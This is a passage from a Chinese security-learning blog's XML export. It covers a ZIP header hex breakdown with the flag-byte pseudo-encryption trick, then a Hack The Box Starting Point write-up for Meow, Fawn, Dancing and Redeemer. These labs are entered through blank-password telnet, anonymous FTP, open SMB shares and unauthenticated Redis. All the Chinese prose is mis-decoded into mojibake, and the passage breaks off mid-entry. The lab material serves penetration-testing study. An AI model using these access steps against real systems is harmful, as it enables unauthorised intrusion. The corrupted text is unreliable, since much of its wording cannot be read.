class="number">7</span>Eï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¶é—´ </span><br><span class="line"><span class="attribute">F7</span> <span class="number">46</span>ï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¥æœŸ </span><br><span class="line"><span class="attribute">16</span> B5 <span class="number">80</span> <span class="number">14</span>ï¼šCRC-<span class="number">32</span>æ ¡éªŒï¼ˆ<span class="number">1480</span>B516ï¼‰ </span><br><span class="line"><span class="attribute">19</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>ï¼šå‹ç¼©åå°ºå¯¸ï¼ˆ<span class="number">25</span>ï¼‰ </span><br><span class="line"><span class="attribute">17</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>ï¼šæœªå‹ç¼©å°ºå¯¸ï¼ˆ<span class="number">23</span>ï¼‰ </span><br><span class="line"><span class="attribute">07</span> <span class="number">00</span>ï¼šæ–‡ä»¶åé•¿åº¦ </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span>ï¼šæ‰©å±•è®°å½•é•¿åº¦ </span><br></pre></td></tr></table></figure><h3 id="4-å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºï¼š"><a href="#4-å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºï¼š" class="headerlink" title="4)å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºï¼š"></a>4)å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºï¼š</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">50</span> <span class="number">4</span>B <span class="number">01</span> <span class="number">02</span>ï¼šç›®å½•ä¸­æ–‡ä»¶æ–‡ä»¶å¤´æ ‡è®°(<span class="number">0</span>x02014b50) </span><br><span class="line"><span class="attribute">3F</span> <span class="number">00</span>ï¼šå‹ç¼©ä½¿ç”¨çš„ pkware ç‰ˆæœ¬ </span><br><span class="line"><span class="attribute">14</span> <span class="number">00</span>ï¼šè§£å‹æ–‡ä»¶æ‰€éœ€ pkware ç‰ˆæœ¬ </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span>ï¼šå…¨å±€æ–¹å¼ä½æ ‡è®°ï¼ˆæœ‰æ— åŠ å¯†ï¼Œè¿™ä¸ªæ›´æ”¹è¿™é‡Œè¿›è¡Œä¼ªåŠ å¯†ï¼Œæ”¹ä¸º<span class="number">09</span> <span class="number">00</span>æ‰“å¼€å°±ä¼šæç¤ºæœ‰å¯†ç äº†ï¼‰ </span><br><span class="line"><span class="attribute">08</span> <span class="number">00</span>ï¼šå‹ç¼©æ–¹å¼ </span><br><span class="line"><span class="attribute">5A</span> <span class="number">7</span>Eï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¶é—´ </span><br><span class="line"><span class="attribute">F7</span> <span class="number">46</span>ï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¥æœŸ </span><br><span class="line"><span class="attribute">16</span> B5 <span class="number">80</span> <span class="number">14</span>ï¼šCRC-<span class="number">32</span>æ ¡éªŒï¼ˆ<span class="number">1480</span>B516ï¼‰ </span><br><span class="line"><span class="attribute">19</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>ï¼šå‹ç¼©åå°ºå¯¸ï¼ˆ<span class="number">25</span>ï¼‰ </span><br><span class="line"><span class="attribute">17</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>ï¼šæœªå‹ç¼©å°ºå¯¸ï¼ˆ<span class="number">23</span>ï¼‰ </span><br><span class="line"><span class="attribute">07</span> <span class="number">00</span>ï¼šæ–‡ä»¶åé•¿åº¦ </span><br><span class="line"><span class="attribute">24</span> <span class="number">00</span>ï¼šæ‰©å±•å­—æ®µé•¿åº¦ </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span>ï¼šæ–‡ä»¶æ³¨é‡Šé•¿åº¦ </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span>ï¼šç£ç›˜å¼€å§‹å· </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span>ï¼šå†…éƒ¨æ–‡ä»¶å±æ€§ </span><br><span class="line"><span class="attribute">20</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>ï¼šå¤–éƒ¨æ–‡ä»¶å±æ€§ </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>ï¼šå±€éƒ¨å¤´éƒ¨åç§»é‡ </span><br><span class="line"><span class="attribute">6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="5-å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—ï¼š"><a href="#5-å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—ï¼š" class="headerlink" title="5)å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—ï¼š"></a>5)å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—ï¼š</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">50 </span><span class="number">4</span>B <span class="number">05</span> <span class="number">06</span>ï¼šç›®å½•ç»“æŸæ ‡è®° </span><br><span class="line"><span class="symbol">00 </span><span class="number">00</span>ï¼šå½“å‰ç£ç›˜ç¼–å· </span><br><span class="line"><span class="symbol">00 </span><span class="number">00</span>ï¼šç›®å½•åŒºå¼€å§‹ç£ç›˜ç¼–å· </span><br><span class="line"><span class="symbol">01 </span><span class="number">00</span>ï¼šæœ¬ç£ç›˜ä¸Šçºªå½•æ€»æ•° </span><br><span class="line"><span class="symbol">01 </span><span class="number">00</span>ï¼šç›®å½•åŒºä¸­çºªå½•æ€»æ•° </span><br><span class="line"><span class="symbol">59 </span><span class="number">00</span> <span class="number">00</span> <span class="number">00</span>ï¼šç›®å½•åŒºå°ºå¯¸å¤§å° </span><br><span class="line"><span class="number">3</span>E <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>ï¼šç›®å½•åŒºå¯¹ç¬¬ä¸€å¼ ç£ç›˜çš„åç§»é‡ </span><br><span class="line"><span class="symbol">00 </span><span class="number">00</span>ï¼šZIP æ–‡ä»¶æ³¨é‡Šé•¿åº¦</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="6-æŸ¥æ‰¾å‹ç¼©æ–‡ä»¶ç›®å½•åŒº"><a href="#6-æŸ¥æ‰¾å‹ç¼©æ–‡ä»¶ç›®å½•åŒº" class="headerlink" title="6)æŸ¥æ‰¾å‹ç¼©æ–‡ä»¶ç›®å½•åŒº"></a>6)æŸ¥æ‰¾å‹ç¼©æ–‡ä»¶ç›®å½•åŒº</h3><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ä¸€èˆ¬é¢å¯¹ä¸€äº›å°çš„æ–‡ä»¶æ—¶ å¾ˆå®¹æ˜“å°±æ‰¾åˆ°  å‹ç¼©æ–‡ä»¶ç›®å½•åŒº çš„æ–‡ä»¶å¤´</span><br><span class="line"></span><br><span class="line">ä½†æ˜¯å½“æˆ‘ä»¬é¢å¯¹ä¸€äº›è¾ƒå¤§çš„æ–‡ä»¶ æ‰¾ å‹ç¼©æ–‡ä»¶ç›®å½•åŒºçš„ æ–‡ä»¶å¤´ <span class="number"> 50 </span>4B<span class="number"> 01 </span>02 å°±æœ‰ç‚¹éº»çƒ¦äº†</span><br><span class="line"></span><br><span class="line">æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ winhex ä¸­çš„æŸ¥æ‰¾ å­—ç¬¦æŸ¥æ‰¾ å¿«é€Ÿæ‰¾åˆ°  å‹ç¼©æ–‡ä»¶ç›®å½•åŒº  çš„æ–‡ä»¶å¤´</span><br><span class="line"></span><br><span class="line">ç„¶åæŠŠ åé¢çš„ å…¨æ–¹ä½æ ‡è®°åŒº çš„<span class="number"> 01 </span>00 æˆ–<span class="number"> 09 </span>00  æ”¹ä¸º<span class="number"> 00 </span>00 ä¿å­˜ åå°±å¯ä»¥æ‰“å¼€å‹ç¼©åŒ…äº†</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto&amp;misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>htbã®STARTING POINT</title>
      <link href="/2022/09/23/STARTING-POINT/"/>
      <url>/2022/09/23/STARTING-POINT/</url>
      
        <content type="html"><![CDATA[<p><strong><code>æƒ³å‡†å¤‡è¯•è¯•OSCPï¼ŒHACK THE BOXè¿˜è¡Œï¼Œå­¦ä¹ ä¸€äº›å®æˆ˜çŸ¥è¯†ï¼Œä»¥åŠä¸€äº›æ¦‚å¿µäº†è§£ï¼Œéƒ¨åˆ†æœºå™¨æ ¹æ®åè®®ï¼Œæˆ‘ä¼šæ€»ç»“çŸ¥è¯†ç‚¹ï¼Œä¸ä¼šç»™å‡ºå…¨éƒ¨</code></strong></p><span id="more"></span><h1 id="STARTING-POINT"><a href="#STARTING-POINT" class="headerlink" title="STARTING POINT"></a>STARTING POINT</h1><h1 id="ç¬¬0å±‚"><a href="#ç¬¬0å±‚" class="headerlink" title="ç¬¬0å±‚"></a>ç¬¬0å±‚</h1><h2 id="Meow"><a href="#Meow" class="headerlink" title="*Meow"></a>*Meow</h2><h3 id="Tags"><a href="#Tags" class="headerlink" title="Tags"></a>Tags</h3><blockquote><p><code>telnet</code></p><p><code>æ¸—é€æµ‹è¯•ä»ª 1 çº§</code></p><p><code>ç½‘ç»œ</code></p><p><code>åè®®</code></p><p><code>ä¾¦å¯Ÿ</code></p><p><code>å¼±å‡­è¯</code></p><p><code>é…ç½®é”™è¯¯</code></p></blockquote><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote><ol><li>VPN å¯åŠ¨åºåˆ—è¾“å‡ºä¸­â€œéš§é“æ¥å£â€çš„ç¼©å†™åç§°ï¼š<code>tun</code></li><li>æˆ‘ä»¬ä½¿ç”¨ä»€ä¹ˆå·¥å…·é€šè¿‡ ICMP å›æ˜¾è¯·æ±‚æµ‹è¯•æˆ‘ä»¬ä¸ç›®æ ‡çš„è¿æ¥ï¼š<code>ping</code>ã€pingä¸èµ°ä»£ç†ã€‘</li><li>ç”¨äºåœ¨ç›®æ ‡ä¸ŠæŸ¥æ‰¾å¼€æ”¾ç«¯å£çš„æœ€å¸¸ç”¨å·¥å…·çš„åç§°æ˜¯ä»€ä¹ˆï¼Ÿï¼š<code>nmap</code></li><li>æˆ‘ä»¬åœ¨æ‰«ææœŸé—´åœ¨ç«¯å£ 23&#x2F;tcp ä¸Šè¯†åˆ«å‡ºä»€ä¹ˆæœåŠ¡ï¼Ÿ:<code>telnet</code>ã€è¿œç¨‹ç™»å½•ã€‘</li><li>ä»€ä¹ˆç”¨æˆ·åèƒ½å¤Ÿä½¿ç”¨ç©ºç™½å¯†ç é€šè¿‡ telnet ç™»å½•ç›®æ ‡ï¼Ÿ: <code>root</code></li></ol></blockquote><h4 id="å‘½ä»¤telnet"><a href="#å‘½ä»¤telnet" class="headerlink" title="å‘½ä»¤telnet"></a>å‘½ä»¤<code>telnet</code></h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">telnet</span><span class="meta"> [target_ip]</span></span><br></pre></td></tr></table></figure><p><img src="/2022/09/23/STARTING-POINT/image-20230127011324556.png" alt="image-20230127011324556"></p><h4 id="telnetå’Œsshçš„åŒºåˆ«"><a href="#telnetå’Œsshçš„åŒºåˆ«" class="headerlink" title="telnetå’Œsshçš„åŒºåˆ«"></a>telnetå’Œsshçš„åŒºåˆ«</h4><blockquote><p>åŠ å¯†æ–¹å¼ä¸åŒï¼š**<code>telnet</code>æ˜¯æ˜ç ä¼ è¾“<strong>ï¼Œ</strong><code>SSH</code>æ˜¯åŠ å¯†ä¼ è¾“**ã€‚ <code>telnet</code>é€šè¿‡<code>TCP/IP</code>åè®®ç°‡æ¥è®¿é—®è¿œç¨‹ç»ˆç«¯ï¼Œ<code>ä¼ è¾“çš„æ•°æ®å’Œå£ä»¤æ˜¯æ˜æ–‡å½¢å¼</code>ã€‚ ç›¸å¯¹æ¥è¯´ä¸å®‰å…¨ï¼Œä½ æ‰€æœ‰çš„æ•°æ®éƒ½å¯è¢«æ”»å‡»è€…ç›´æ¥æ•è·ã€‚ <strong>SSHç›¸å¯¹äºtelnetå®‰å…¨</strong>ï¼Œå®ƒçš„<code>ä¼ è¾“æ–¹å¼æ˜¯ä»¥åŠ å¯†å½¢å¼ä¼ è¾“</code></p></blockquote><h2 id="Fawn"><a href="#Fawn" class="headerlink" title="*Fawn"></a>*Fawn</h2><h3 id="Tags-1"><a href="#Tags-1" class="headerlink" title="Tags"></a>Tags</h3><blockquote><p><code>æ¸—é€æµ‹è¯•ä»ª 1 çº§</code></p><p><code>ftp</code></p><p><code>ç½‘ç»œ</code></p><p><code>åè®®</code></p><p><code>ä¾¦å¯Ÿ</code></p><p><code>åŒ¿å/è®¿å®¢è®¿é—®</code></p></blockquote><h3 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote><ol><li><p>3 ä¸ªå­—æ¯çš„é¦–å­—æ¯ç¼©ç•¥è¯ FTP ä»£è¡¨ä»€ä¹ˆï¼Ÿ: <code>File Transfer Protocol</code>(æ–‡ä»¶ä¼ è¾“åè®®)</p></li><li><p>FTPæœåŠ¡é€šå¸¸ç›‘å¬å“ªä¸ªç«¯å£ï¼Ÿ: <code>21</code></p></li><li><p>FTP çš„å®‰å…¨ç‰ˆæœ¬ä½¿ç”¨ä»€ä¹ˆé¦–å­—æ¯ç¼©å†™è¯ï¼Ÿ: <code>SFTP</code></p></li><li><p>å½“æ‚¨æƒ³åœ¨æ²¡æœ‰å¸æˆ·çš„æƒ…å†µä¸‹ç™»å½•æ—¶ï¼Œé€šè¿‡ <code>FTP</code> ä½¿ç”¨çš„ç”¨æˆ·åæ˜¯ä»€ä¹ˆï¼Ÿ: <code>anonymous</code></p></li><li><p>æˆ‘ä»¬å¾—åˆ°çš„ FTP æ¶ˆæ¯â€œç™»å½•æˆåŠŸâ€çš„å“åº”ä»£ç æ˜¯ä»€ä¹ˆï¼Ÿ:<code>230</code></p><p><img src="/2022/09/23/STARTING-POINT/image-20230127001710275.png" alt="image-20230127001710275"></p></li><li><p>ç”¨äºä¸‹è½½æˆ‘ä»¬åœ¨ FTP æœåŠ¡å™¨ä¸Šæ‰¾åˆ°çš„æ–‡ä»¶çš„å‘½ä»¤æ˜¯ä»€ä¹ˆï¼Ÿ:<code>get</code></p></li></ol></blockquote><h4 id="å‘½ä»¤ftp"><a href="#å‘½ä»¤ftp" class="headerlink" title="å‘½ä»¤ftp"></a>å‘½ä»¤<code>ftp</code></h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp <span class="selector-attr">[USER@]</span>HOST <span class="selector-attr">[PORT]</span></span><br></pre></td></tr></table></figure><p><img src="/2022/09/23/STARTING-POINT/image-20230127011036214.png" alt="image-20230127011036214"></p><h4 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h4><blockquote><p>æ–‡ä»¶ä¼ è¾“åè®®ï¼ˆFile Transfer Protocolï¼ŒFTPï¼‰æ˜¯ç”¨äºåœ¨<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C?fromModule=lemma_inlink">ç½‘ç»œ</a>ä¸Šè¿›è¡Œæ–‡ä»¶ä¼ è¾“çš„ä¸€å¥—æ ‡å‡†åè®®ï¼Œå®ƒå·¥ä½œåœ¨ OSI æ¨¡å‹çš„ç¬¬ä¸ƒå±‚ï¼Œ TCP æ¨¡å‹çš„ç¬¬å››å±‚ï¼Œ å³åº”ç”¨å±‚ï¼Œ ä½¿ç”¨ TCP ä¼ è¾“è€Œä¸æ˜¯ UDPï¼Œ å®¢æˆ·åœ¨å’ŒæœåŠ¡å™¨å»ºç«‹è¿æ¥å‰è¦ç»è¿‡ä¸€ä¸ªâ€œä¸‰æ¬¡æ¡æ‰‹â€çš„è¿‡ç¨‹ï¼Œ ä¿è¯å®¢æˆ·ä¸æœåŠ¡å™¨ä¹‹é—´çš„è¿æ¥æ˜¯å¯é çš„ï¼Œ è€Œä¸”æ˜¯é¢å‘è¿æ¥ï¼Œ ä¸ºæ•°æ®ä¼ è¾“æä¾›å¯é ä¿è¯ã€‚</p></blockquote><h4 id="SFTP"><a href="#SFTP" class="headerlink" title="SFTP"></a>SFTP</h4><blockquote><p><code>sftp</code>æ˜¯Secure File Transfer Protocolçš„ç¼©å†™ï¼Œå®‰å…¨æ–‡ä»¶ä¼ é€åè®®ã€‚å¯ä»¥ä¸ºä¼ è¾“æ–‡ä»¶æä¾›ä¸€ç§å®‰å…¨çš„ç½‘ç»œçš„åŠ å¯†æ–¹æ³•ã€‚sftp ä¸ ftp æœ‰ç€å‡ ä¹ä¸€æ ·çš„è¯­æ³•å’ŒåŠŸèƒ½ã€‚<code>SFTP ä¸º SSHçš„å…¶ä¸­ä¸€éƒ¨åˆ†</code>ï¼Œæ˜¯ä¸€ç§ä¼ è¾“æ¡£æ¡ˆè‡³ Blogger ä¼ºæœå™¨çš„å®‰å…¨æ–¹å¼ã€‚å…¶å®åœ¨<code>SSHè½¯ä»¶åŒ…</code>ä¸­ï¼Œå·²ç»åŒ…å«äº†ä¸€ä¸ªå«ä½œ<code>SFTP(Secure File Transfer Protocol)çš„å®‰å…¨æ–‡ä»¶ä¿¡æ¯ä¼ è¾“å­ç³»ç»Ÿ</code>ï¼ŒSFTP<code>æœ¬èº«æ²¡æœ‰å•ç‹¬çš„å®ˆæŠ¤è¿›ç¨‹</code>ï¼Œå®ƒ<code>å¿…é¡»ä½¿ç”¨sshdå®ˆæŠ¤è¿›ç¨‹ï¼ˆç«¯å£å·é»˜è®¤æ˜¯22ï¼‰</code>æ¥å®Œæˆç›¸åº”çš„è¿æ¥å’Œç­”å¤æ“ä½œï¼Œæ‰€ä»¥ä»æŸç§æ„ä¹‰ä¸Šæ¥è¯´ï¼ŒSFTPå¹¶ä¸åƒä¸€ä¸ªæœåŠ¡å™¨ç¨‹åºï¼Œè€Œæ›´åƒæ˜¯ä¸€ä¸ªå®¢æˆ·ç«¯ç¨‹åºã€‚</p><p>SFTPåŒæ ·æ˜¯ä½¿ç”¨åŠ å¯†ä¼ è¾“è®¤è¯ä¿¡æ¯å’Œä¼ è¾“çš„æ•°æ®ï¼Œæ‰€ä»¥ï¼Œä½¿ç”¨SFTPæ˜¯éå¸¸å®‰å…¨çš„ã€‚ä½†æ˜¯ï¼Œç”±äºè¿™ç§ä¼ è¾“æ–¹å¼ä½¿ç”¨äº†åŠ å¯†&#x2F;è§£å¯†æŠ€æœ¯ï¼Œæ‰€ä»¥<code>ä¼ è¾“æ•ˆç‡æ¯”æ™®é€šçš„FTPè¦ä½å¾—å¤š</code>ï¼Œå¦‚æœæ‚¨å¯¹ç½‘ç»œå®‰å…¨æ€§è¦æ±‚æ›´é«˜æ—¶ï¼Œå¯ä»¥ä½¿ç”¨SFTPä»£æ›¿FTPã€‚</p></blockquote><h2 id="Dancing"><a href="#Dancing" class="headerlink" title="*Dancing"></a>*Dancing</h2><h3 id="Tags-2"><a href="#Tags-2" class="headerlink" title="Tags"></a>Tags</h3><blockquote><p><code>ç½‘ç»œ</code></p><p><code>åè®®</code></p><p><code>SMB</code></p><p><code>æ¸—é€æµ‹è¯•ä»ª 1 çº§</code></p><p><code>ä¾¦å¯Ÿ</code></p><p><code>åŒ¿å/è®¿å®¢è®¿é—®</code></p></blockquote><h3 id="çŸ¥è¯†ç‚¹-2"><a href="#çŸ¥è¯†ç‚¹-2" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote><ol><li>3 ä¸ªå­—æ¯çš„é¦–å­—æ¯ç¼©ç•¥è¯ SMB ä»£è¡¨ä»€ä¹ˆï¼Ÿ:<code>Server Message Block</code>(æœåŠ¡å™¨æ¶ˆæ¯å—)</li><li>SMB ä½¿ç”¨å“ªä¸ªç«¯å£è¿›è¡Œæ“ä½œï¼Ÿ: <code>445</code></li><li>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ SMB å·¥å…·æ¥â€œåˆ—å‡ºâ€å…±äº«å†…å®¹çš„â€œæ ‡å¿—â€æˆ–â€œå¼€å…³â€æ˜¯ä»€ä¹ˆï¼Ÿ: <code>-L</code></li><li>æˆ‘ä»¬æœ€ç»ˆèƒ½å¤Ÿä½¿ç”¨ç©ºç™½å¯†ç è®¿é—®çš„å…±äº«åç§°æ˜¯ä»€ä¹ˆï¼Ÿ: <code>WorkShares</code></li><li>æˆ‘ä»¬å¯ä»¥åœ¨ SMB shell ä¸­ä½¿ç”¨ä»€ä¹ˆå‘½ä»¤æ¥ä¸‹è½½æˆ‘ä»¬æ‰¾åˆ°çš„æ–‡ä»¶ï¼Ÿ: <code>get</code></li></ol></blockquote><h4 id="å‘½ä»¤smbclient"><a href="#å‘½ä»¤smbclient" class="headerlink" title="å‘½ä»¤smbclient"></a>å‘½ä»¤<code>smbclient</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> smbclient -L [target_ip]</span><br><span class="line">#åˆ—å‡ºæ‰€æœ‰å¯ç”¨å…±äº«</span><br></pre></td></tr></table></figure><p><img src="/2022/09/23/STARTING-POINT/image-20230127010237573.png" alt="image-20230127010237573"></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbclient <span class="symbol">\\</span><span class="symbol">\\</span>[target_ip]<span class="symbol">\\</span>WorkShares</span><br><span class="line">#è¿æ¥åˆ° WorkShares</span><br></pre></td></tr></table></figure><p><img src="/2022/09/23/STARTING-POINT/image-20230127010626438.png" alt="image-20230127010626438"></p><h4 id="ä»€ä¹ˆæ˜¯SMB"><a href="#ä»€ä¹ˆæ˜¯SMB" class="headerlink" title="ä»€ä¹ˆæ˜¯SMB"></a>ä»€ä¹ˆæ˜¯SMB</h4><blockquote><p><code>SMB</code>æ˜¯å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨çš„äº¤äº’åè®®ï¼Œå®¢æˆ·ç«¯åœ¨å…¶ä¸­è¯·æ±‚æ–‡ä»¶ï¼Œç„¶åæœåŠ¡å™¨å°†æ–‡ä»¶æä¾›ç»™å®¢æˆ·ç«¯ã€‚</p><p>ç°åœ¨ï¼Œå®ƒæ˜¯ä¸€ä¸ªåŸºäºWindowsçš„ç½‘ç»œï¼Œä½¿ç”¨æˆ·å¯ä»¥åˆ›å»ºï¼Œä¿®æ”¹å’Œåˆ é™¤ç½‘ç»œä¸­çš„å…±äº«æ–‡ä»¶ï¼Œæ–‡ä»¶å¤¹ï¼Œæ‰“å°æœºã€‚SMBæ˜¯ä½¿ç”¨TCPç«¯å£445è¿›è¡Œé€šä¿¡çš„åº”ç”¨ç¨‹åºåˆ†å±‚åè®®ã€‚</p><p>å®ƒè¿˜æä¾›äº†ä¸€ç§è‰æ ¹åŒ–çš„äº’é€šæœºåˆ¶ï¼Œå¯ä»¥åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´è¿›è¡Œä¼ è¾“ä»¥å…±äº«æ–‡ä»¶ã€‚éšç€å…¶ç‰ˆæœ¬çš„å‡çº§ï¼ŒæœåŠ¡å°†å¾—åˆ°æ›´å¤§çš„å¢å¼ºï¼Œå¹¶å¯ä»¥è¢«ç”¨æˆ·æˆ–å®¢æˆ·ç«¯æœ‰æ•ˆä½¿ç”¨ã€‚</p></blockquote><h4 id="SMBå¦‚ä½•è¿ä½œ"><a href="#SMBå¦‚ä½•è¿ä½œ" class="headerlink" title="SMBå¦‚ä½•è¿ä½œ"></a>SMBå¦‚ä½•è¿ä½œ</h4><blockquote><p><code>SMB</code>æ˜¯ä¸€ç§è¯·æ±‚-å“åº”åè®®ï¼Œè¿™æ„å‘³ç€å®ƒåœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´ä¼ è¾“å¤šæ¡æ¶ˆæ¯ä»¥å®Œæˆè¯·æ±‚ã€‚</p></blockquote><h4 id="FTP-SMB-NFSçš„åŒºåˆ«"><a href="#FTP-SMB-NFSçš„åŒºåˆ«" class="headerlink" title="FTP, SMB, NFSçš„åŒºåˆ«"></a>FTP, SMB, NFSçš„åŒºåˆ«</h4><p><img src="/2022/09/23/STARTING-POINT/image-20230127003921531.png" alt="image-20230127003921531"></p><blockquote><p><code>NFS</code> æœ€å¥½ï¼Œé€Ÿåº¦å¿«ç‚¹ï¼Œé…ç½®å¤æ‚ç‚¹<br><code>FTP</code> æœ€é€šç”¨ï¼Œæœ€ç®€å•<br><code>SMB</code> ä¸å¤ªç¨³å®šï¼Œæœ‰æ—¶å€™Win ä¼šæç¤ºæ‰¾ä¸åˆ°åœ°å€</p></blockquote><h2 id="Redeemer"><a href="#Redeemer" class="headerlink" title="Redeemer"></a>Redeemer</h2><h3 id="Tags-3"><a href="#Tags-3" class="headerlink" title="Tags"></a>Tags</h3><blockquote><p><code>Redis</code></p><p><code>æ¸—é€æµ‹è¯•ä»ª 1 çº§</code></p><p><code>æ¼æ´è¯„ä¼°</code></p><p><code>æ•°æ®åº“</code></p><p><code>ä¾¦å¯Ÿ</code></p><p><code>åŒ¿å/è®¿å®¢è®¿é—®</code></p></blockquote><h3 id="çŸ¥è¯†ç‚¹-3"><a href="#çŸ¥è¯†ç‚¹-3" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote><ol><li>Redis æ˜¯ä»€ä¹ˆç±»å‹çš„æ•°æ®åº“ï¼Ÿ:<code>In-memory Database</code>(å†…å­˜æ•°æ®åº“)</li><li>å“ªä¸ªå‘½ä»¤è¡Œå®ç”¨ç¨‹åºç”¨äºä¸ Redis æœåŠ¡å™¨äº¤äº’ï¼Ÿè¾“å…¥æ‚¨è¦åœ¨ç»ˆç«¯ä¸­è¾“å…¥çš„ç¨‹åºåç§°ï¼Œä¸å¸¦ä»»ä½•å‚æ•°ã€‚: <code>redis-cli</code></li><li>Redis å‘½ä»¤è¡Œå®ç”¨ç¨‹åºä½¿ç”¨å“ªä¸ªæ ‡å¿—æ¥æŒ‡å®šä¸»æœºåï¼Ÿ: <code>-h</code></li><li>è¿æ¥åˆ°RedisæœåŠ¡å™¨åï¼Œä½¿ç”¨å“ªä¸ªå‘½ä»¤è·å–æœ‰å…³RedisæœåŠ¡å™¨çš„ä¿¡æ¯å’Œç»Ÿè®¡ä¿¡æ¯ï¼Ÿ: <code>info</code></li><li>åœ¨ Redis ä¸­ä½¿ç”¨å“ªä¸ªå‘½ä»¤æ¥é€‰æ‹©æ‰€éœ€çš„æ•°æ®åº“ï¼Ÿ:  <code>select</code></li><li>å“ªä¸ªå‘½ä»¤ç”¨äºè·å–æ•°æ®åº“ä¸­çš„æ‰€æœ‰é”®ï¼Ÿï¼š <code>keys *</code></li><li>å“ªä¸ªå‘½ä»¤ç”¨äºè¯»å–é”®å€¼?ï¼š<code>get</code></li></ol></blockquote><h4 id="å‘½ä»¤redis-cli"><a href="#å‘½ä»¤redis-cli" class="headerlink" title="å‘½ä»¤redis-cli"></a>å‘½ä»¤<code>redis-cli</code></h4><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-<span class="keyword">cli</span> -h target_ip</span><br><span class="line"><span class="meta">#è¿æ¥åˆ° redis æœåŠ¡å™¨</span></span><br></pre></td></tr></table></figure><p><img src="/2022/09/23/STARTING-POINT/image-20230127145928047.png" alt="image-20230127145928047"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">keys</span> * </span><br><span class="line"><span class="comment">#è·å–æ•°æ®åº“ä¸­çš„æ‰€æœ‰é”®</span></span><br></pre></td></tr></table></figure><p><img src="/2022/09/23/STARTING-POINT/image-20230127145944398.png" alt="image-20230127145944398"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">get</span> flag</span><br><span class="line"><span 